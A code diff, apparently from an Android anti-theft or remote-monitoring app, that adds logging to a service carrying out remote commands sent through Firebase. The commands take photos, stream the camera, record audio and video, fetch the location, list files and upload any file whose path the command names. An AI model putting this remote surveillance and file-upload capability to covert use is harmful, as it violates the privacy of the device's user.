@@ -123,35 +123,68 @@ class RemoteGuardService : LifecycleService() {
 
         try {
             when {
-                command == "take_photo" -> cameraManager.takePhoto(this)
-                command == "start_stream" -> cameraManager.startStreaming(this)
-                command == "stop_stream" -> cameraManager.stopStreaming()
-                command == "start_video" -> cameraManager.startVideoRecording(this)
-                command == "stop_video" -> cameraManager.stopVideoRecording()
-                command == "start_audio" -> voiceRecordingManager.startAudioRecording(this)
-                command == "stop_audio" -> voiceRecordingManager.stopAudioRecording(this)
+                command == "take_photo" -> {
+                    Log.d("RemoteGuardService", "Executing: take_photo")
+                    cameraManager.takePhoto(this)
+                }
+                command == "start_stream" -> {
+                    Log.d("RemoteGuardService", "Executing: start_stream")
+                    cameraManager.startStreaming(this)
+                }
+                command == "stop_stream" -> {
+                    Log.d("RemoteGuardService", "Executing: stop_stream")
+                    cameraManager.stopStreaming()
+                }
+                command == "start_video" -> {
+                    Log.d("RemoteGuardService", "Executing: start_video")
+                    cameraManager.startVideoRecording(this)
+                }
+                command == "stop_video" -> {
+                    Log.d("RemoteGuardService", "Executing: stop_video")
+                    cameraManager.stopVideoRecording()
+                }
+                command == "start_audio" -> {
+                    Log.d("RemoteGuardService", "Executing: start_audio")
+                    voiceRecordingManager.startAudioRecording(this)
+                }
+                command == "stop_audio" -> {
+                    Log.d("RemoteGuardService", "Executing: stop_audio")
+                    voiceRecordingManager.stopAudioRecording(this)
+                }
                 command == "switch_camera" -> {
+                    Log.d("RemoteGuardService", "Executing: switch_camera")
                     cameraManager.switchCamera(this)
                     FirebaseHelper.updateLastSeen(this, "camera_switched_${cameraManager.getCurrentCameraName()}")
                 }
-                command == "get_location" -> locationManager.getCurrentLocation {}
-                command == "list_files" -> FileManager.listFiles(this)
+                command == "get_location" -> {
+                    Log.d("RemoteGuardService", "Executing: get_location")
+                    locationManager.getCurrentLocation()
+                }
+                command == "list_files" -> {
+                    Log.d("RemoteGuardService", "Executing: list_files")
+                    FileManager.listFiles(this)
+                }
                 command?.startsWith("list_files:") == true -> {
                     val path = command.substringAfter("list_files:")
+                    Log.d("RemoteGuardService", "Executing: list_files:$path")
                     FileManager.listFiles(this, path)
                 }
                 command?.startsWith("upload_file:") == true -> {
                     val path = command.substringAfter("upload_file:")
+                    Log.d("RemoteGuardService", "Executing: upload_file:$path")
                     FileManager.uploadFile(this, path)
                 }
                 else -> {
+                    Log.w("RemoteGuardService", "Unsupported command: $command")
                     cmdRef.child("status").setValue("failed")
                     cmdRef.child("error").setValue("Unsupported command: $command")
                     return
                 }
             }
+            Log.d("RemoteGuardService", "Command executed successfully: $command")
             cmdRef.child("status").setValue("completed")
         } catch (e: Exception) {
+            Log.e("RemoteGuardService", "Error executing command $command: ${e.message}", e)
             cmdRef.child("status").setValue("failed")
             cmdRef.child("error").setValue(e.message ?: "Command execution failed")
         }
